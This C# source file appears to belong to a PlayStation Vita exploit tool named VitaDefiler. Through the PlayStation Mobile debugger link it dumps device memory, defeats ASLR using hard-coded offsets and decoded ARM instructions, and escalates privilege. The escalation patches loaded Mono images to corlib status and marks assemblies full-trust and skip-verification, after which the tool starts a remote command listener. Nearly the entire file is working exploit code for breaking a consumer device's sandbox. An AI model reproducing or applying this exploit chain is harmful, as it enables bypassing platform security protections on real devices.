using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Reflection;
using Mono.Debugger.Soft;
using System.Runtime.InteropServices;
using System.Threading;
using VitaDefiler.PSM;
using System.Security.Permissions;

namespace VitaDefiler
{
    class USB
    {
        private static readonly int BLOCK_SIZE = 0x100;
        private static readonly string INSTALL_NAME = "VitaDefilerClient";

        private Vita _vita;

        public USB(string package, string appkeypath)
        {
            _vita = new Vita(INSTALL_NAME, package, appkeypath);
        }

        private static Int64 UIntToVitaInt(uint val)
        {
            Int64 vita_val = BitConverter.ToInt64(new byte[] { 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF }, 0);
            vita_val += val;
            return vita_val;
        }

        private static uint VitaIntToUInt(Int64 val)
        {
            Int64 vita_val = BitConverter.ToInt64(new byte[] { 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF }, 0);
            val -= vita_val;
            return (uint)val;
        }

        public void Connect(Action<string> consoleCallback)
        {
            _vita.Start(consoleCallback);
        }

        public void Disconnect()
        {
            _vita.Stop();
        }

        public void StartDump(uint addr, uint len, FileStream dump = null)
        {
            if (len == 0)
            {
                // dump all of ram
                len = 0xFFFFFFFF - addr;
            }
            long methid_copy = _vita.GetMethod(true, "System.Runtime.InteropServices.Marshal", "Copy", 4, new string[] { "IntPtr", "Byte[]", "Int32", "Int32" });
            if (methid_copy < 0)
            {
                Console.WriteLine("Cannot find Copy method.");
                return;
            }
            // weird address format for IntPtr on vita
            /* DEPRECATED BECAUSE GC WILL DELETE THESE
            ValueImpl src = v.CreateIntPtr(UIntToVitaInt(addr));
            ValueImpl dest = v.CreateArray("System.Byte", BLOCK_SIZE);
             */
            ValueImpl dest = _vita.GetField(false, "VitaDefilerClient.AppMain", "dest");
            dest.Type = ElementType.Object; // must be done
            ValueImpl src = _vita.GetField(false, "VitaDefilerClient.AppMain", "src");
            if (dest == null)
            {
                Console.WriteLine("Cannot find buffer to write to.");
                return;
            }
            if (src == null)
            {
                Console.WriteLine("Cannot find pointer to read from.");
                return;
            }
            src.Fields[0].Value = UIntToVitaInt(addr);
            byte[] block = new byte[BLOCK_SIZE];
            // error block will be written when block cannot be read
            byte[] error_block = new byte[BLOCK_SIZE];
            for (int i = 0; i < BLOCK_SIZE; i++)
                error_block[i] = (byte)'X';
            ValueImpl sti = new ValueImpl();
            ValueImpl dlen = new ValueImpl();
            sti.Type = ElementType.I4;
            dlen.Type = ElementType.I4;
            sti.Value = 0;
            dlen.Value = BLOCK_SIZE;
            _vita.Suspend();
            Console.WriteLine("Starting dump...");
            for (int d = 0; d * BLOCK_SIZE <= len; d++)
            {
                try
                {
                    if (dump != null)
                    {
                        dump.Flush();
                    }
                    Console.WriteLine("Dumping 0x{0:X}", src.Fields[0].Value);
                    ValueImpl ret = _vita.RunMethod(methid_copy, null, new ValueImpl[] { src, dest, sti, dlen }, true);
                    if (ret == null)
                    {
                        throw new TargetException("Method never returned.");
                    }
                    _vita.GetBuffer(dest.Objid, BLOCK_SIZE, ref block);
                    if (dump == null)
                    {
                        block.PrintHexDump((uint)BLOCK_SIZE, 16);
                    }
                    int num = BLOCK_SIZE;
                    if (d * BLOCK_SIZE + num > len)
                        num = (int)(len - d * BLOCK_SIZE);
                    if (dump != null)
                    {
                        dump.Write(block, 0, num);
                    }
                }
                catch (InvalidOperationException) // vm not suspended, retry
                {
                    Console.WriteLine("VM_NOT_SUSPENDED, retrying...");
                    d--;
                    continue;
                }
                catch (Vita.RunMethodException ex)
                {
                    Console.WriteLine("Error dumping 0x{0:X}: {1}", src.Fields[0].Value, ex.Message.ToString());
                    int num = BLOCK_SIZE;
                    if (d * BLOCK_SIZE + num > len)
                        num = (int)(len - d * BLOCK_SIZE);
                    if (dump != null)
                    {
                        dump.Write(error_block, 0, num);
                    }
                }
                // next block to dump
                src.Fields[0].Value = (Int64)src.Fields[0].Value + BLOCK_SIZE;
                if (d % 1000 == 0)
                {
                    // must be done or app will freeze
                    _vita.Resume();
                    _vita.Suspend();
                }
            }
            if (dump != null)
            {
                dump.Close();
            }
            _vita.Resume();
        }

        public uint DefeatASLR(out uint images_hash_ptr, out uint alloc_fptr, out uint free_fptr, out uint unlock_fptr, out uint lock_fptr, out uint flush_fptr, out uint libkernel_anchor)
        {
            // step 0, setup
            long methid_gettype = _vita.GetMethod(true, "System.Type", "GetType", 1, new string[] { "String" });
            if (methid_gettype < 0)
            {
                throw new TargetException("Cannot get method id for Type.GetType");
            }
            long methid_getmethod = _vita.GetMethod(true, "System.Type", "GetMethod", 1, new string[] { "String" });
            if (methid_getmethod < 0)
            {
                throw new TargetException("Cannot get method id for Type.GetMethod");
            }
            long methid_getruntimehandle = _vita.GetMethod(true, "System.Reflection.MonoMethod", "get_MethodHandle", 0, new string[] {});
            if (methid_getruntimehandle < 0)
            {
                throw new TargetException("Cannot get method id for System.Reflection.MonoMethod.get_MethodHandle");
            }
            long methid_fptr = _vita.GetMethod(true, "System.RuntimeMethodHandle", "GetFunctionPointer", 0, new string[] { });
            if (methid_fptr < 0)
            {
                throw new TargetException("Cannot get method id for System.RuntimeMethodHandle.GetFunctionPointer");
            }
            long methid_readint32 = _vita.GetMethod(true, "System.Runtime.InteropServices.Marshal", "ReadInt32", 2, new string[] { "IntPtr", "Int32" });
            if (methid_readint32 < 0)
            {
                throw new TargetException("Cannot get method id for ReadInt32");
            }

            // step 1, get method handle
            ValueImpl environment_str = _vita.CreateString("System.Environment");
            ValueImpl env_type = _vita.RunMethod(methid_gettype, null, new ValueImpl[] { environment_str });
            Console.WriteLine("System.Environment Type object: 0x{0:X}", VitaIntToUInt((Int64)env_type.Objid));
            ValueImpl exit_str = _vita.CreateString("Exit");
            env_type.Type = ElementType.Object; // BUG with debugger
            ValueImpl methodinfo = _vita.RunMethod(methid_getmethod, env_type, new ValueImpl[] { exit_str });
            Console.WriteLine("System.Environment.Exit MonoMethod object: 0x{0:X}", VitaIntToUInt((Int64)methodinfo.Objid));
            methodinfo.Type = ElementType.Object; // BUG with debugger
            ValueImpl runtimehandle = _vita.RunMethod(methid_getruntimehandle, methodinfo, new ValueImpl[] { });
            Console.WriteLine("System.Environment.Exit RuntimeMethodHandle object: 0x{0:X}", VitaIntToUInt((Int64)runtimehandle.Objid));
            ValueImpl funcptr = _vita.RunMethod(methid_fptr, runtimehandle, new ValueImpl[] { });
            Console.WriteLine("System.Environment.Exit function pointer: 0x{0:X}", VitaIntToUInt((Int64)funcptr.Fields[0].Value));

            // step 2, read function pointer to Exit icall from JIT code
            ValueImpl offset = new ValueImpl();
            offset.Type = ElementType.I4;
            offset.Value = 0x90;
            ValueImpl movw_val = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { funcptr, offset });
            offset.Value = 0x94;
            ValueImpl movt_val = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { funcptr, offset });
            uint addr;
            uint instr;
            Utilities.DecodeResult type;
            instr = VitaIntToUInt((Int32)movw_val.Value);
            addr = Utilities.DecodeARM32(instr, out type);
            if (type != Utilities.DecodeResult.INSTRUCTION_MOVW)
            {
                throw new TargetException(string.Format("Invalid instruction, expected MOVW, got: 0x{0:X}", instr));
            }
            instr = VitaIntToUInt((Int32)movt_val.Value);
            addr |= Utilities.DecodeARM32(instr, out type) << 16;
            if (type != Utilities.DecodeResult.INSTRUCTION_MOVT)
            {
                throw new TargetException(string.Format("Invalid instruction, expected MOVT, got: 0x{0:X}", instr));
            }
            Console.WriteLine("Found fptr for Environment.Exit at: 0x{0:X}", addr);

            // step 3, use offset to find mono_images_init and get hashmap pointer
            uint mono_images_init_addr = addr - 1 + 0x1206;
            ValueImpl initaddr = _vita.CreateIntPtr(UIntToVitaInt(mono_images_init_addr));
            offset.Value = 0;
            movw_val = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { initaddr, offset });
            offset.Value = 4;
            movt_val = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { initaddr, offset });
            instr = VitaIntToUInt((Int32)movw_val.Value);
            images_hash_ptr = Utilities.DecodeThumb2((UInt16)(instr & 0xFFFF), (UInt16)(instr >> 16), out type);
            if (type != Utilities.DecodeResult.INSTRUCTION_MOVW)
            {
                throw new TargetException(string.Format("Invalid instruction, expected MOVW, got: 0x{0:X}", instr));
            }
            instr = VitaIntToUInt((Int32)movt_val.Value);
            images_hash_ptr |= (uint)Utilities.DecodeThumb2((UInt16)(instr & 0xFFFF), (UInt16)(instr >> 16), out type) << 16;
            if (type != Utilities.DecodeResult.INSTRUCTION_MOVT)
            {
                throw new TargetException(string.Format("Invalid instruction, expected MOVT, got: 0x{0:X}", instr));
            }
            Console.WriteLine("Found ptr for loaded_images_hash at: 0x{0:X}", images_hash_ptr);

            // step 4, use offset to find import table for SceLibMonoBridge functions
            uint import_table = addr - 1 + 0x12D7A2;
            ValueImpl faddr = _vita.CreateIntPtr(UIntToVitaInt(import_table));
            offset.Value = 0x184;
            ValueImpl fval = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { faddr, offset });
            unlock_fptr = VitaIntToUInt((Int32)fval.Value);
            offset.Value = 0x198;
            fval = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { faddr, offset });
            lock_fptr = VitaIntToUInt((Int32)fval.Value);
            offset.Value = 0x350;
            fval = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { faddr, offset });
            free_fptr = VitaIntToUInt((Int32)fval.Value);
            offset.Value = 0x468;
            fval = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { faddr, offset });
            alloc_fptr = VitaIntToUInt((Int32)fval.Value);
            offset.Value = 0x40;
            fval = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { faddr, offset });
            flush_fptr = VitaIntToUInt((Int32)fval.Value);
            // find SceLibKernel import table for anchor
            import_table = addr - 1 + 0x12DD7E;
            faddr = _vita.CreateIntPtr(UIntToVitaInt(import_table));
            offset.Value = 0x0;
            fval = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { faddr, offset });
            libkernel_anchor = VitaIntToUInt((Int32)fval.Value);
            Console.WriteLine("Found unlock 0x{0:X}, lock 0x{1:X}, free 0x{2:X}, alloc 0x{3:X}, anchor 0x{4:X}", unlock_fptr, lock_fptr, free_fptr, alloc_fptr, libkernel_anchor);

            return 0;
        }

        public void EscalatePrivilege(uint mono_images_hashmap_pointer)
        {
            // step 0, setup
            long methid_readintptr = _vita.GetMethod(true, "System.Runtime.InteropServices.Marshal", "ReadIntPtr", 2, new string[] { "IntPtr", "Int32" });
            if (methid_readintptr < 0)
            {
                throw new TargetException("Cannot get method id for ReadIntPtr");
            }
            long methid_readint32 = _vita.GetMethod(true, "System.Runtime.InteropServices.Marshal", "ReadInt32", 2, new string[] { "IntPtr", "Int32" });
            if (methid_readint32 < 0)
            {
                throw new TargetException("Cannot get method id for ReadInt32");
            }
            long methid_writeint32 = _vita.GetMethod(true, "System.Runtime.InteropServices.Marshal", "WriteInt32", 3, new string[] { "IntPtr", "Int32", "Int32" });
            if (methid_writeint32 < 0)
            {
                throw new TargetException("Cannot get method id for WriteInt32");
            }
            // step 1, find out where the hashmap is stored
            ValueImpl zero = new ValueImpl();
            zero.Type = ElementType.I4;
            zero.Value = 0;
            ValueImpl ptr_to_hashmap = _vita.CreateIntPtr(UIntToVitaInt(mono_images_hashmap_pointer));
            ValueImpl offset = new ValueImpl();
            offset.Type = ElementType.I4;
            offset.Value = 0;
            ValueImpl hashmap = _vita.RunMethod(methid_readintptr, null, new ValueImpl[] { ptr_to_hashmap, offset });
            Console.WriteLine("Images hashmap located at: 0x{0:X}", VitaIntToUInt((Int64)hashmap.Fields[0].Value));
            // step 2, find hashmap data
            offset.Value = 8;
            ValueImpl hashmap_data = _vita.RunMethod(methid_readintptr, null, new ValueImpl[] { hashmap, offset });
            Console.WriteLine("Hashmap entries located at: 0x{0:X}", VitaIntToUInt((Int64)hashmap_data.Fields[0].Value));
            offset.Value = 12;
            ValueImpl hashmap_len = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { hashmap, offset });
            Console.WriteLine("Images hashmap has {0} entries", hashmap_len.Value);
            // step 3, get entries
            Console.WriteLine("Patching all loaded images to be corlib images.");
            for (int i = 0; i < (Int32)hashmap_len.Value; i++)
            {
                offset.Value = i * 4;
                ValueImpl entry = _vita.RunMethod(methid_readintptr, null, new ValueImpl[] { hashmap_data, offset });
                while (VitaIntToUInt((Int64)entry.Fields[0].Value) > 0) // each item in slot
                {
                    Console.WriteLine("Entry {0} found at: 0x{1:X}", i, VitaIntToUInt((Int64)entry.Fields[0].Value));
                    offset.Value = 4;
                    ValueImpl image_data = _vita.RunMethod(methid_readintptr, null, new ValueImpl[] { entry, offset });
                    Console.WriteLine("Image data found at: 0x{0:X}", VitaIntToUInt((Int64)image_data.Fields[0].Value));
                    offset.Value = 16;
                    ValueImpl image_attributes = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { image_data, offset });
                    Console.WriteLine("Image attributes: 0x{0:X}", image_attributes.Value);
                    // step 4, patch the attribute to include corlib
                    image_attributes.Value = (Int32)image_attributes.Value | (1 << 10);
                    _vita.RunMethod(methid_writeint32, null, new ValueImpl[] { image_data, offset, image_attributes });
                    Console.WriteLine("Image attributes patched to: 0x{0:X}", image_attributes.Value);

                    // step 5, patch assembly to skip verification
                    Console.WriteLine("Patching assembly in this image to be full trust and skip verification.");
                    offset.Value = 664;
                    ValueImpl assembly = _vita.RunMethod(methid_readintptr, null, new ValueImpl[] { image_data, offset });
                    Console.WriteLine("Found assembly at: 0x{0:X}", VitaIntToUInt((Int64)assembly.Fields[0].Value));
                    offset.Value = 88;
                    ValueImpl assembly_attributes = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { assembly, offset });
                    Console.WriteLine("Assembly attributes: 0x{0:X}", assembly_attributes.Value);
                    // set ecma, aptc, fulltrust, unmanaged, skipverification to true and initialized
                    assembly_attributes.Value = (Int32)assembly_attributes.Value | (0xFFFF << 16);
                    _vita.RunMethod(methid_writeint32, null, new ValueImpl[] { assembly, offset, assembly_attributes });
                    Console.WriteLine("Assembly attributes patched to: 0x{0:X}", assembly_attributes.Value);

                    offset.Value = 8;
                    entry = _vita.RunMethod(methid_readintptr, null, new ValueImpl[] { entry, offset }); // next item in this slot in hashmap
                }

            }
        }

        public void StartNetworkListener()
        {
            /*
            ValueImpl ready = new ValueImpl();
            ready.Value = true;
            _vita.SetField(false, "VitaDefilerClient.AppMain", "exploited", ready);
             */
            long methid_exploit = _vita.GetMethod(false, "VitaDefilerClient.CommandListener", "StartListener", 0, null);
            _vita.RunMethod(methid_exploit, null, null);
        }
    }
}

namespace VitaDefiler.PSM
{
    class VitaConnection : Connection
    {
        private int handle;

        public VitaConnection(string port)
        {
            this.handle = TransportFunctions.CreateFile(1, @"\\.\" + port);
            if (this.handle < 0)
            {
                throw new IOException("Error opening port for connection.");
            }
        }

        protected override void TransportClose()
        {
            TransportFunctions.CloseHandle(1, handle);
            this.handle = -1;
        }

        protected override unsafe int TransportReceive(byte[] buf, int buf_offset, int len)
        {
            while (this.handle != -1)
            {
                int recieve = TransportFunctions.GetReceiveSize(1, this.handle);
                uint read = 0;
                if (recieve >= len)
                {
                    fixed (byte* p_buf = buf)
                    {
                        if (TransportFunctions.ReadFile(1, this.handle, (IntPtr)(p_buf + buf_offset), (uint)len, out read) == 0)
                        {
                            throw new IOException("Cannot read from Vita.");
                        }
                        else
                        {
                            return (int)read;
                        }
                    }
                }
                //Thread.Sleep(30);
            }
            return 0;
        }

        protected override unsafe int TransportSend(byte[] buf, int buf_offset, int len)
        {
            int towrite = len;
            uint written = 0;
            fixed (byte* p_buf = buf)
            {
                while (towrite > 0)
                {
                    if (TransportFunctions.WriteFile(1, this.handle, (IntPtr)(p_buf + buf_offset), (uint)towrite, out written) == 0)
                    {
                        throw new IOException("Cannot write to Vita.");
                    }
                    towrite -= (int)written;
                }
            }
            return len;
        }

        protected override void TransportSetTimeouts(int send_timeout, int receive_timeout)
        {
            return;
        }
    }

    class ConnEventHandler : IEventHandler
    {
        public void Events(SuspendPolicy suspend_policy, EventInfo[] events)
        {
            foreach (EventInfo e in events)
            {
                Console.WriteLine("Event Recieved: {0}", e.EventType);
            }
        }

        public void VMDisconnect(int req_id, long thread_id, string vm_uri)
        {
            return;
        }

        public void ErrorEvent(object sender, EventArgs e)
        {
            return;
        }
    }

    class Vita
    {
        public class RunMethodException : Exception
        {
            public RunMethodException(string msg)
                : base(msg)
            {

            }
        }

        private long rootdomain = -1, threadid = -1, corlibid = -1, assid = -1;
        private Guid handle;
        private VitaConnection conn;
        private string name;
        private string package;
        private string appkeypath;
        private PsmDeviceConsoleCallback callback;
        private Thread reciever;

        public Vita(string name, string package, string appkeypath)
        {
            this.name = name;
            this.package = Path.GetFullPath(package);
            this.appkeypath = appkeypath;
        }

        private void HandleConnErrorHandler(object sender, ErrorHandlerEventArgs args)
        {
            Console.WriteLine("Error: {0}", args.ErrorCode);
            switch (args.ErrorCode)
            {
                case ErrorCode.NOT_IMPLEMENTED:
                    throw new NotSupportedException("This request is not supported by the protocol version implemented by the debuggee.");

                case ErrorCode.NOT_SUSPENDED:
                    throw new InvalidOperationException("The vm is not suspended.");

                case ErrorCode.ABSENT_INFORMATION:
                    throw new AbsentInformationException();

                case ErrorCode.NO_SEQ_POINT_AT_IL_OFFSET:
                    throw new ArgumentException("Cannot set breakpoint on the specified IL offset.");

                case ErrorCode.INVALID_FRAMEID:
                    throw new InvalidStackFrameException();

                case ErrorCode.INVALID_OBJECT:
                    throw new ObjectCollectedException();
            }
            throw new NotImplementedException(String.Format("{0}", args.ErrorCode));
        }

        public void Start(Action<string> consoleCallback)
        {
            Console.WriteLine("Waiting for Vita to connect...");
            ScePsmDevice? vita = null;
            int ret;
            for (; ; )
            {
                ScePsmDevice[] deviceArray = new ScePsmDevice[8];
                PSMFunctions.ListDevices(deviceArray);
                foreach (ScePsmDevice dev in deviceArray)
                {
                    if (dev.online > 0)
                    {
                        vita = dev;
                        break;
                    }
                }
                if (vita != null)
                {
                    break;
                }
            }
            Guid devId = vita.Value.guid;
            string serial = new string(vita.Value.deviceID, 0, 17);
            Console.WriteLine("Found Vita {0}, serial: {1}", devId, serial);
            if ((ret = PSMFunctions.Connect(devId)) < 0)
            {
                Console.WriteLine("Error connecting to Vita: 0x{0:X}", ret);
                throw new IOException("Cannot connect to Vita.");
            }
            this.handle = devId;

            // request version or other calls will fail
            PSMFunctions.Version(this.handle);

#if USE_APP_KEY
            byte[] buffer = File.ReadAllBytes("kdev.p12");

            if ((ret = PSMFunctions.ExistAppExeKey(this.handle, DRMFunctions.ReadAccountIdFromKdevP12(buffer), "*", "np")) != 1)
            {
                Console.WriteLine("Setting app key to: {0}", appkeypath);
                if ((ret = PSMFunctions.SetAppExeKey(this.handle, appkeypath)) != 0)
                {
                    Console.WriteLine("Error setting key: 0x{0:X}", ret);
                    throw new IOException("Cannot set app key.");
                }
            }
#endif

#if !NO_INSTALL_PACKAGE
            Console.WriteLine("Installing package {0} as {1}.", package, name);
            if ((ret = PSMFunctions.Install(this.handle, package, name)) != 0)
            {
                Console.WriteLine("Error installing package: 0x{0:X}", ret);
                throw new IOException("Cannot connect to Vita.");
            }
#endif

            callback = new PsmDeviceConsoleCallback(consoleCallback);
            Console.WriteLine("Setting console callback.");
            PSMFunctions.SetConsoleWrite(this.handle, Marshal.GetFunctionPointerForDelegate(callback));

            Console.WriteLine("Launching {0}.", name);
            if ((ret = PSMFunctions.Launch(this.handle, name, true, false, false, false, "")) != 0)
            {
                Console.WriteLine("Error running application: 0x{0:X}", ret);
                throw new IOException("Cannot connect to Vita.");
            }

            Console.WriteLine("Connecting debugger.");
            string port = TransportFunctions.GetVitaPortWithSerial(serial);
            if (port == null)
            {
                Console.WriteLine("Cannot find serial port for {0}", serial);
                throw new IOException("Cannot find serial port.");
            }
            conn = new VitaConnection(port);
            conn.EventHandler = new ConnEventHandler();
            conn.ErrorHandler += HandleConnErrorHandler;
            conn.Connect(out reciever);

            Console.WriteLine("Waiting for app to start up...");
            conn.VM_Resume();
            Thread.Sleep(5000);
            Console.WriteLine("Getting variables.");
            rootdomain = conn.RootDomain;
            corlibid = conn.Domain_GetCorlib(rootdomain);
            assid = conn.Domain_GetEntryAssembly(rootdomain);
            foreach (long thread in conn.VM_GetThreads())
            {
                if (conn.Thread_GetName(thread) == "")
                {
                    threadid = thread;
                }
            }
            //Console.WriteLine ("Root Domain: {0}\nCorlib: {1}\nExeAssembly: {2}\nThread: {3}", rootdomain, corlibid, assid, threadid);
            Console.WriteLine("Ready for hacking.");
        }

        [SecurityPermissionAttribute(SecurityAction.Demand, ControlThread = true)]
        public void Stop()
        {
            Console.WriteLine("Stopping debugger.");
            if (reciever != null)
            {
                reciever.Abort();
            }
            conn.Close();
            conn = null;
#if CLEAN_EXIT
            Console.WriteLine("Killing running app.");
            PSMFunctions.Kill(this.handle);
            //Console.WriteLine("Uninstalling app.");
            //PSMFunctions.Uninstall(this.handle, name);
            Console.WriteLine("Disconnecting Vita.");
            PSMFunctions.Disconnect(this.handle);
#endif
        }

        public void Suspend()
        {
            conn.VM_Suspend();
        }

        public void Resume()
        {
            conn.VM_Resume();
        }

        public long GetMethod(bool incorlib, string typename, string methodname, int numparams, string[] paramtypenames)
        {
            long assembly = incorlib ? corlibid : assid;
            long type = conn.Assembly_GetType(assembly, typename, false);
            long[] methods = conn.Type_GetMethods(type);
            foreach (long method in methods)
            {
                string name = conn.Method_GetName(method);
                if (name != methodname)
                    continue;
                ParamInfo info = conn.Method_GetParamInfo(method);
                if (info.param_count != numparams)
                    continue;
                if (paramtypenames != null)
                {
                    bool bad = false;
                    for (int i = 0; i < paramtypenames.Length; i++)
                    {
                        if (conn.Type_GetInfo(info.param_types[i]).name != paramtypenames[i])
                        {
                            bad = true;
                            break;
                        }
                    }
                    if (bad)
                    {
                        continue;
                    }
                }
                return method;
            }
            return -1;
        }

        public ValueImpl RunMethod(long methodid, ValueImpl thisval, ValueImpl[] param)
        {
            return RunMethod(methodid, thisval, param, false);
        }

        // pausing the VM is slow, if we're calling this a million times, only need to pause once
        public ValueImpl RunMethod(long methodid, ValueImpl thisval, ValueImpl[] param, bool paused)
        {
            if (thisval == null)
            {
                thisval = new ValueImpl();
                thisval.Type = (ElementType)0xf0;
            }
            ValueImpl ret, exc;
            if (!paused)
            {
                conn.VM_Suspend(); // must be suspended
            }
            ret = conn.VM_InvokeMethod(threadid, methodid, thisval, param == null ? new ValueImpl[] { } : param, InvokeFlags.NONE, out exc);
            if (!paused)
            {
                conn.VM_Resume();
            }
            if (ret != null)
            {
                return ret;
            }
            if (exc != null)
            {
                long excmeth = GetMethod(true, "System.Exception", "ToString", 0, null);
                exc.Type = ElementType.Object; // must do this stupid mono
                ValueImpl excmsg = RunMethod(excmeth, exc, null, paused);
                Console.WriteLine(conn.String_GetValue(excmsg.Objid));
                throw new RunMethodException("Error running method.");
            }
            return null;
        }

        public ValueImpl GetField(bool incorlib, string typename, string fieldname)
        {
            long assembly = incorlib ? corlibid : assid;
            long typeid = conn.Assembly_GetType(assembly, typename, false);
            string[] f_names;
            long[] f_types;
            int[] f_attrs;
            long[] fields = conn.Type_GetFields(typeid, out f_names, out f_types, out f_attrs);
            long targetfield = -1;

            int i;
            for (i = 0; i < f_names.Length; i++)
            {
                if (f_names[i] == fieldname)
                {
                    targetfield = fields[i];
                    break;
                }
            }
            if (targetfield < 0)
            {
                return null;
            }
            ValueImpl[] values = conn.Type_GetValues(typeid, new long[] { targetfield }, threadid);
            if (values == null || values.Length == 0)
            {
                return null;
            }
            return values[0];
        }

        public void SetField(bool incorlib, string typename, string fieldname, ValueImpl value)
        {
            long assembly = incorlib ? corlibid : assid;
            long typeid = conn.Assembly_GetType(assembly, typename, false);
            string[] f_names;
            long[] f_types;
            int[] f_attrs;
            long[] fields = conn.Type_GetFields(typeid, out f_names, out f_types, out f_attrs);
            long targetfield = -1;

            int i;
            for (i = 0; i < f_names.Length; i++)
            {
                if (f_names[i] == fieldname)
                {
                    targetfield = fields[i];
                    break;
                }
            }
            if (targetfield < 0)
            {
                Console.Error.WriteLine("Cannot find field '{0}'", fieldname);
                return;
            }
            conn.Type_SetValues(typeid, new long[] { targetfield }, new ValueImpl[] { value });
        }

        public void GetBuffer(long objid, int len, ref byte[] buf)
        {
            if (buf == null)
            {
                buf = new byte[len];
            }
            ValueImpl[] vals = conn.Array_GetValues(objid, 0, len);
            for (int i = 0; i < vals.Length; i++)
            {
                buf[i] = (byte)vals[i].Value;
            }
        }

        public void SetBuffer(long objid, byte[] buf, int offset, int len)
        {
            if (buf == null || buf.Length == 0)
                return;
            if (len > buf.Length)
                throw new ArgumentException("len > buf.Length");

            ValueImpl[] vals = new ValueImpl[len];
            for (int i = 0; i < len; i++)
            {
                vals[i] = new ValueImpl();
                vals[i].Type = ElementType.U1;
                vals[i].Value = buf[offset + i];
            }
            conn.Array_SetValues(objid, offset, vals);
        }

        public void SetArray(long objid, ValueImpl[] values)
        {
            conn.Array_SetValues(objid, 0, values);
        }

        public long GetTypeObjID(bool incorlib, string name)
        {
            long assembly = incorlib ? corlibid : assid;
            long tid = conn.Assembly_GetType(assembly, name, true);
            return conn.Type_GetObject(tid);
        }

        public int GetArrayLength(long objid)
        {
            int rank;
            int[] lower_bounds;
            int[] len = conn.Array_GetLength(objid, out rank, out lower_bounds);
            if (rank != 1)
            {
                return -1;
            }
            return len[0];
        }

        public ValueImpl CreateString(string str)
        {
            ValueImpl data = new ValueImpl();
            data.Type = ElementType.Object;
            data.Objid = conn.Domain_CreateString(conn.RootDomain, str);
            return data;
        }

        public ValueImpl CreateIntPtr(Int64 val)
        {
            long methid_alloc = GetMethod(true, "System.Runtime.InteropServices.Marshal", "AllocHGlobal", 1, new string[] { "Int32" });
            if (methid_alloc < 0)
            {
                throw new TargetException("Cannot get id to create new IntPtr");
            }
            ValueImpl zero = new ValueImpl();
            zero.Type = ElementType.I4;
            zero.Value = 0;
            ValueImpl data = RunMethod(methid_alloc, null, new ValueImpl[] { zero }); // this is to get the IntPtr type
            data.Fields[0].Value = val;
            return data;
        }

        public ValueImpl CreateArray(string typename, int length)
        {
            long type_tocreate = GetTypeObjID(true, typename);
            long methid_createarray = GetMethod(true, "System.Array", "CreateInstance", 2, new string[] { "Type", "Int32" });
            if (methid_createarray < 0)
            {
                throw new TargetException("Cannot get id to create new array.");
            }
            ValueImpl arg_elementtype = new ValueImpl();
            ValueImpl arg_length = new ValueImpl();
            arg_elementtype.Type = ElementType.Object;
            arg_elementtype.Objid = type_tocreate;
            arg_length.Type = ElementType.I4;
            arg_length.Value = length;
            ValueImpl val_array = RunMethod(methid_createarray, null, new ValueImpl[] { arg_elementtype, arg_length });
            val_array.Type = ElementType.Object; // fix bug
            return val_array;
        }

        public long GetCorlibModule()
        {
            return conn.Assembly_GetManifestModule(corlibid);
        }
    }
}
